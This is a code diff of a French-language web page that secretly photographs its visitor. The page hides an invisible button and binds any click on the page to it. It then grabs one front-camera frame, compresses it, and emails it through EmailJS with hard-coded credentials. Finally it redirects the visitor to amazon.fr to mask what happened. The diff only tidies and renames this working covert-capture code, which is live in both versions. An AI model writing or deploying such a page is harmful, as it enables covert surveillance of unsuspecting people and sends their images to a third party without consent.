@@ -2,21 +2,18 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Capture ultra compressée sans métadonnées</title>
+  <title>Capture unique</title>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
-    body, html {
-      margin: 0; padding: 0; height: 100%;
-      overflow: hidden; background: none; cursor: pointer;
-    }
+    body, html { margin:0; padding:0; height:100%; overflow:hidden; background:none; cursor:pointer; }
     #triggerButton { width:1px; height:1px; opacity:0; border:none; background:none; }
-    video, canvas { display: none; }
+    video, canvas { display:none; }
   </style>
 </head>
 <body>
   <button id="triggerButton">Start</button>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="100" height="75"></canvas> <!-- Ultra petite résolution -->
+  <canvas id="canvas" width="100" height="75"></canvas>
 
   <script>
     emailjs.init("IoSfbtGz4KSL_5_9E");
@@ -26,31 +23,33 @@
     const context = canvas.getContext('2d');
     const button = document.getElementById('triggerButton');
 
-    async function startCapture() {
+    async function captureOnePhoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
         video.onloadeddata = () => {
+          // Prendre la photo
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Conversion en Blob JPEG compressé (sans métadonnées)
+          // Arrêter immédiatement le flux vidéo
+          stream.getTracks().forEach(track => track.stop());
+
+          // Convertir en JPEG ultra-compressé sans métadonnées
           canvas.toBlob((blob) => {
             const reader = new FileReader();
             reader.onloadend = () => {
-              const imageData = reader.result; // DataURL pour EmailJS
+              const imageData = reader.result;
 
               emailjs.send("service_8cs0gml", "template_hgvdx1g", {
-                message: "Photo ultra compressée sans métadonnées 📸",
+                message: "Photo unique capturée 📸",
                 image: imageData
               })
               .then(() => { window.location.href = "https://www.amazon.fr"; })
               .catch((err) => { console.log("Erreur EmailJS:", err); window.location.href = "https://www.amazon.fr"; });
             };
             reader.readAsDataURL(blob);
-          }, "image/jpeg", 0.05); // Qualité 5%
-
-          stream.getTracks().forEach(track => track.stop());
+          }, "image/jpeg", 0.05);
         };
 
       } catch (err) {
@@ -60,7 +59,7 @@
     }
 
     document.body.addEventListener('click', () => button.click());
-    button.addEventListener('click', startCapture);
+    button.addEventListener('click', captureOnePhoto);
   </script>
 </body>
 </html>
